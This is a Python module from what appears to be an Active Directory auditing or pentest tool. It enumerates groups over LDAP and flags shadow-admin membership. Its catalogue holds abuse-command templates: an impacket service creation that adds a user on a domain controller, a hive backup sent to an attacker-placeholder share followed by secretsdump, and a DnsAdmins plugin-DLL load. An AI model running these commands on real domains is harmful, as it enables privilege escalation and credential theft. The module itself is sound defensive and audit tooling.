"""
Groups module — enumerate groups and analyse privileged / shadow-admin membership.

Inventory is the easy part. The value here is **escalation analysis**: membership
of certain groups grants a privilege most audits overlook because the group name
is not "Domain Admins". Each such group is matched by **SID / RID** (robust to
renaming and locale) with a name fallback for the RID-less ones (DnsAdmins,
Exchange, DHCP…), and a non-empty one yields a Quick Win carrying the concrete
escalation path and an abuse command:

* DnsAdmins → load a DLL into the DNS service → SYSTEM on a DC.
* Backup Operators → SeBackupPrivilege → read SAM / NTDS.dit → DCSync-equivalent.
* Server Operators → create a service on a DC → SYSTEM.
* Print Operators → SeLoadDriverPrivilege + local logon to DCs.
* Account Operators → reset passwords / add members to unprotected privileged
  groups (e.g. DnsAdmins) → chain.
* Schema Admins → alter a class defaultSecurityDescriptor → stealth persistence.
* Exchange Windows Permissions → WriteDACL on the domain → DCSync (PrivExchange).
* Key / Enterprise Key Admins → key-credential write → Shadow Credentials.

Also resolves members (with `member;range=` retrieval for >1500-member groups),
flags **nested groups** and **foreign (cross-domain) members**. Pure LDAP.

⚠️ NOT VALIDATED LIVE (v2.15.0): the escalation analysis / range retrieval is
   implemented and unit-tested against synthetic records; plain group inventory
   was validated earlier.
"""

from modules.base import BaseModule, ScanContext
from core.output import Severity, C
from utils.ldap_helpers import get_attr, get_int, get_list, get_raw, get_dn, SCOPE_BASE
from utils.sids import bytes_to_sid, resolve_sid

_GROUP_FILTER = "(objectClass=group)"
_ATTRS = [
    "sAMAccountName", "distinguishedName", "description",
    "member", "memberOf", "objectSid", "groupType", "adminCount",
]

_SEV = {"CRITICAL": Severity.CRITICAL, "HIGH": Severity.HIGH,
        "MEDIUM": Severity.MEDIUM, "INFO": Severity.INFO}

# ---------------------------------------------------------------------------
# Privileged / shadow-admin catalog.
# Each value: (label, severity, impact, abuse_cmd_template). {dc}/{dom} in the
# command template are substituted at render time.
# ---------------------------------------------------------------------------

# "Core" tier: expected to be populated → roster only (INFO), not an alarm.
_CORE_RIDS = {512, 519}
_CORE_BUILTIN = {"S-1-5-32-544"}

# Domain-relative RIDs
_PRIV_RID = {
    512: ("Domain Admins", "CRITICAL", "Full control of the domain.", ""),
    519: ("Enterprise Admins", "CRITICAL",
          "Full control of every domain in the forest.", ""),
    518: ("Schema Admins", "CRITICAL",
          "Modify the AD schema — e.g. alter a class defaultSecurityDescriptor so "
          "every newly created object of that class is attacker-controlled (stealth "
          "persistence). Default-empty: any member is notable.", ""),
    520: ("Group Policy Creator Owners", "HIGH",
          "Create new GPOs; with a link/edit right this is code execution in the "
          "linked scope (cross-check the gpo module).", ""),
    517: ("Cert Publishers", "MEDIUM",
          "Members' hosts are trusted to publish certificates; relevant to ADCS / "
          "NTAuth review (cross-check the adcs module).", ""),
    526: ("Key Admins", "HIGH",
          "Write msDS-KeyCredentialLink on accounts → Shadow Credentials → "
          "authenticate as and recover the NT hash of targets (PKINIT).",
          "certipy-ad shadow auto -u '<member>@{dom}' -p '<password>' "
          "-account <target> -dc-ip {dc}"),
    527: ("Enterprise Key Admins", "HIGH",
          "Forest-wide key-credential write → Shadow Credentials on any account.",
          "certipy-ad shadow auto -u '<member>@{dom}' -p '<password>' "
          "-account <target> -dc-ip {dc}"),
}

# Builtin groups (S-1-5-32-*)
_PRIV_BUILTIN = {
    "S-1-5-32-544": ("Administrators", "CRITICAL",
          "Local administrators of the domain controllers → domain compromise.", ""),
    "S-1-5-32-548": ("Account Operators", "HIGH",
          "Create/modify and reset passwords of non-protected (non-adminCount) users "
          "and groups. Chain: add yourself to an unprotected but powerful group "
          "(DnsAdmins, Server/Print Operators, Exchange groups) → escalate.", ""),
    "S-1-5-32-549": ("Server Operators", "CRITICAL",
          "Create/modify services on domain controllers → run a command as SYSTEM "
          "on a DC.",
          "impacket-services '<DOM>/<member>:<password>'@{dc} create -name svc "
          "-display svc -path 'C:\\Windows\\System32\\cmd.exe /c net user x P@ss1! /add'\n"
          "  impacket-services '<DOM>/<member>:<password>'@{dc} start -name svc"),
    "S-1-5-32-550": ("Print Operators", "HIGH",
          "Hold SeLoadDriverPrivilege (load a malicious kernel driver → SYSTEM) and "
          "may log on locally to domain controllers.", ""),
    "S-1-5-32-551": ("Backup Operators", "CRITICAL",
          "Hold SeBackupPrivilege → read protected files (SAM/SYSTEM, and the DC's "
          "NTDS.dit via raw/VSS) remotely → offline hash extraction (DCSync-equiv).",
          "impacket-reg '<DOM>/<member>:<password>'@{dc} backup -o "
          "'\\\\<ATTACKER>\\share'\n"
          "  impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL   "
          "# + NTDS via the saved hives / BackupOperatorToolkit"),
    "S-1-5-32-552": ("Replicators", "MEDIUM",
          "Legacy FRS replication group; rarely populated — a member is unusual.", ""),
    "S-1-5-32-554": ("Pre-Windows 2000 Compatible Access", "HIGH",
          "If this group contains Everyone / Anonymous, large parts of AD become "
          "readable without authentication (legacy anonymous enumeration).", ""),
}

# RID-less groups matched by sAMAccountName substring (lowercased).
_PRIV_BY_NAME = [
    ("dnsadmins", ("DnsAdmins", "CRITICAL",
          "Reconfigure the DNS service (ServerLevelPluginDll) to load an arbitrary "
          "DLL → code execution as SYSTEM on the DC when the service restarts.",
          "# set the plugin DLL (UNC to an attacker share), then bounce the service:\n"
          "  dnscmd {dc} /config /serverlevelplugindll \\\\<ATTACKER>\\share\\poc.dll\n"
          "  sc.exe \\\\{dc} stop dns && sc.exe \\\\{dc} start dns")),
    ("exchange windows permissions", ("Exchange Windows Permissions", "CRITICAL",
          "On pre-2019 Exchange this group holds WriteDACL on the domain object → "
          "grant yourself DS-Replication rights and DCSync (PrivExchange family).", "")),
    ("exchange trusted subsystem", ("Exchange Trusted Subsystem", "HIGH",
          "Highly privileged Exchange group — member of Exchange Windows Permissions "
          "→ domain DACL abuse paths.", "")),
    ("organization management", ("Organization Management", "HIGH",
          "Exchange org admins — control of Exchange security groups (incl. Exchange "
          "Windows Permissions) → domain escalation.", "")),
    ("dhcp administrators", ("DHCP Administrators", "MEDIUM",
          "Manage DHCP; combined with DnsUpdateProxy enables DNS record spoofing.", "")),
    ("dnsupdateproxy", ("DnsUpdateProxy", "MEDIUM",
          "DNS records created by members are left unsecured (no owner ACL) → any "
          "user can overwrite them (ADIDNS spoofing; cross-check the adidns module).",
          "")),
    ("remote management users", ("Remote Management Users", "MEDIUM",
          "WinRM access to member hosts → lateral movement with a member's creds.", "")),
    ("protected users", ("Protected Users", "INFO",
          "Defensive group (hardens members' Kerberos: no NTLM/RC4/delegation). "
          "Note which privileged accounts are NOT in it.", "")),
]


def _group_type_str(gt: int) -> str:
    if gt == 0:
        return ""
    security  = bool(gt & 0x80000000)
    local     = bool(gt & 0x00000004)
    global_   = bool(gt & 0x00000002)
    universal = bool(gt & 0x00000008)
    scope = "Domain Local" if local else ("Universal" if universal else
            ("Global" if global_ else "?"))
    kind  = "Security" if security else "Distribution"
    return f"{scope} {kind}"


def _catalog_match(sid: str, name: str, dsid: str):
    """Return (label, sev, impact, cmd, is_core) for a privileged group, or None."""
    if sid and dsid and sid.startswith(dsid + "-"):
        try:
            rid = int(sid[len(dsid) + 1:])
        except ValueError:
            rid = -1
        if rid in _PRIV_RID:
            lbl, sev, imp, cmd = _PRIV_RID[rid]
            return (lbl, sev, imp, cmd, rid in _CORE_RIDS)
    if sid in _PRIV_BUILTIN:
        lbl, sev, imp, cmd = _PRIV_BUILTIN[sid]
        return (lbl, sev, imp, cmd, sid in _CORE_BUILTIN)
    n = (name or "").lower()
    for key, (lbl, sev, imp, cmd) in _PRIV_BY_NAME:
        if key in n:
            return (lbl, sev, imp, cmd, False)
    return None


class GroupsModule(BaseModule):
    name        = "groups"
    description = "Group enumeration + privileged / shadow-admin escalation analysis"

    def run(self, ctx: ScanContext) -> None:
        out = ctx.out
        out.section("GROUPS")

        entries = ctx.conn.search(_GROUP_FILTER, _ATTRS)
        if not entries:
            out.warning("No groups found (check permissions)")
            return

        dsid = ctx.domain_sid
        group_dns = {get_dn(e).lower() for e in entries}
        # also index by distinguishedName attr (some records carry both)
        for e in entries:
            d = get_attr(e, "distinguishedName")
            if d:
                group_dns.add(d.lower())

        all_groups = []
        matches = []   # catalog hits

        for entry in entries:
            sam  = get_attr(entry, "sAMAccountName")
            dn   = get_attr(entry, "distinguishedName") or get_dn(entry)
            gt   = get_int(entry, "groupType")
            desc = get_attr(entry, "description")
            raw  = get_raw(entry, "objectSid")
            sid  = bytes_to_sid(raw) if raw else ""
            members = self._all_members(ctx, entry, dn)

            all_groups.append({"sam": sam, "type": _group_type_str(gt),
                               "members": members, "desc": desc})

            hit = _catalog_match(sid, sam, dsid)
            if hit:
                lbl, sev, imp, cmd, is_core = hit
                matches.append({
                    "sam": sam, "label": lbl, "sev": sev, "impact": imp,
                    "cmd": cmd, "is_core": is_core, "members": members,
                    "type": _group_type_str(gt),
                })

        out.counter("Groups", len(all_groups), {
            "privileged": len(matches),
        })

        self._report_privileged(ctx, matches, group_dns, dsid)

        if ctx.out.verbose:
            out.subsection("All Groups")
            rows = [[g["sam"], g["type"], str(len(g["members"])), g["desc"]]
                    for g in all_groups]
            out.table(["Name", "Type", "Members", "Description"], rows,
                      highlight_fn=lambda r: C.YELLOW
                      if any(m["sam"] == r[0] for m in matches) else None)

    # ---------------------------------------------------------- member paging
    @staticmethod
    def _all_members(ctx: ScanContext, rec: dict, dn: str) -> list:
        """Members of a group, following `member;range=` for >1500-member groups."""
        direct = get_list(rec, "member")
        ranged_keys = [k for k in rec if k.startswith("member;range=")]
        if not ranged_keys:
            return direct

        # AD truncated: re-fetch in ranges from the start.
        out, start, step = [], 0, 1500
        while True:
            attr = f"member;range={start}-*"
            res = ctx.conn.search("(objectClass=*)", [attr], base=dn, scope=SCOPE_BASE)
            if not res:
                break
            r = res[0]
            key = next((k for k in r if k.startswith("member;range=")), None)
            if key is None:
                out += get_list(r, "member")   # final (small) chunk returns 'member'
                break
            out += get_list(r, key)
            end = key.rsplit("-", 1)[-1]
            if end == "*":
                break
            try:
                start = int(end) + 1
            except ValueError:
                break
        return out or direct

    # ---------------------------------------------------- member classification
    @staticmethod
    def _classify_member(member_dn: str, group_dns: set, dsid: str):
        """Return (display, tag) where tag ∈ {'', 'group', 'foreign'}."""
        d = member_dn.lower()
        if ",cn=foreignsecurityprincipals," in d:
            rid_sid = member_dn.split(",", 1)[0].split("=", 1)[-1]
            return (resolve_sid(rid_sid, dsid), "foreign")
        cn = member_dn.split(",", 1)[0].split("=", 1)[-1]
        if d in group_dns:
            return (cn, "group")
        return (cn, "")

    # ------------------------------------------------------------- reporting
    def _report_privileged(self, ctx: ScanContext, matches: list,
                           group_dns: set, dsid: str) -> None:
        out = ctx.out
        populated = [m for m in matches if m["members"]]
        if not populated:
            out.success("No privileged / shadow-admin group has members "
                        "(or none readable)")
            return

        out.subsection("Privileged & shadow-admin groups")

        order = {Severity.CRITICAL: 0, Severity.HIGH: 1,
                 Severity.MEDIUM: 2, Severity.INFO: 3}
        populated.sort(key=lambda m: (order.get(_SEV[m["sev"]], 9), m["label"]))

        dc  = ctx.args.dc
        dom = ctx.domain or ""

        rows = []
        for m in populated:
            sev = "INFO (roster)" if m["is_core"] else m["sev"]
            rows.append([m["label"], str(len(m["members"])), sev,
                         m["impact"].split(".")[0]])
        out.table(["Group", "Members", "Severity", "Escalation"], rows, indent=4,
                  highlight_fn=lambda r: C.RED if r[2] == "CRITICAL"
                  else (C.YELLOW if r[2] == "HIGH" else None))

        for m in populated:
            # resolve + tag members
            disp = []
            foreign = False
            for md in m["members"]:
                name, tag = self._classify_member(md, group_dns, dsid)
                if tag == "foreign":
                    foreign = True
                    disp.append(f"  • {name}  [FOREIGN]")
                elif tag == "group":
                    disp.append(f"  • {name}  (nested group)")
                else:
                    disp.append(f"  • {name}")

            cmd = m["cmd"].replace("{dc}", dc).replace("{dom}", dom) if m["cmd"] else ""

            if m["is_core"]:
                ctx.quick_wins.add(
                    Severity.INFO,
                    f"{m['label']} — {len(m['members'])} member(s)",
                    m["impact"] + "\n" + "\n".join(disp)
                    + ("\n  ⚠ includes FOREIGN (cross-domain) member(s) — "
                       "trust-based path." if foreign else ""),
                )
                continue

            detail = (f"Members ({len(m['members'])}):\n" + "\n".join(disp) + "\n\n"
                      f"Escalation: {m['impact']}")
            if foreign:
                detail += ("\n⚠ Includes a FOREIGN (cross-domain) member → the "
                           "escalation is reachable across a trust.")
            if cmd:
                detail += "\nIf you control one of the members:\n  " + cmd
            ctx.quick_wins.add(
                _SEV[m["sev"]],
                f"Shadow-admin group '{m['label']}' has {len(m['members'])} member(s)",
                detail,
            )
